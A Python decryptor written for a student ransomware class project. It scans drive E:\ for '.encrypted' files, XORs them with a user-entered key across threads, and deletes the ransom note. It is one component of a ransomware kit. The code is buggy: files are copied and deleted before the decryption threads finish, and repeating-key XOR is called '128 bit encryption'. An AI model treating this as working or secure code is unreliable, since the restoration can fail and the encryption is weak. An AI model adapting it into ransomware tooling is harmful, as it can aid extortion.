"""
Author: Ethan Allis
Class: SEC-440-01
Assignment: Project 3 - Ransomware and Mitigation
Credit to Python Esper for inspiration and assistance.
"""

""" This code is for educational purposes only and should not be duplicated for personal use """

# Import lists
import os
import shutil
from pathlib import Path
from threading import Thread
from queue import Queue

# Testing safegaurd, should be commented out
safegaurd = input("Please confirm program start by typing 'start': ")
if safegaurd != "start":
    print(f'Terminating Program')
    quit()

# Program startup
print(f'You have made a wise decision...')
print(f'DECRYPTING FILES')

# Target file extensions to be decrypted, any can be added
decrypted_ext = '.encrypted'

# List of file paths & files from victim target directory
file_paths = []
for root, dirs, files, in os.walk('E:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in decrypted_ext:
            file_paths.append(root+'\\'+file)

# Defined 128 bit encryption method
encryption_level = 128 // 8

# File decryption process
def decrypt(enc_key):
    while q.not_empty:
        file = q.get()
        key_index = 0
        max_key_index = encryption_level - 1
        # Try/except logic for admin protected files
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(enc_key[key_index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                    if key_index >= max_key_index:
                        key_index = 0
                    else:
                        key_index += 1
        except:
            print(f'Could not decrypt {file}, moving on')
        q.task_done()


# User input for decryption key
enc_key = input("Please enter your key for file decryption: ")

# Adding file paths to queue object for multithreading encryption
q = Queue()
for file in file_paths:
    q.put(file)

# Multithreading functionality
for i in range(30):
    thread = Thread(target=decrypt, args=(enc_key,), daemon=True)
    thread.start()

# Removes encrypted file extensions, removes encrypted files
for file in file_paths:
    dec_file = Path(file)
    dec_file_restored = dec_file.with_suffix('')
    shutil.copy(file, dec_file_restored)
    os.remove(file)

# Waits for queue object to be empty before moving on with program
q.join()

# Removes ransomware readme
try:
    os.remove('E:\\RANSOMWARE_READ_ME.txt')
except:
    pass

# Decryption process complete
print(f'DECRYPTION SUCCESSFUL')
print(f'Please come again!')
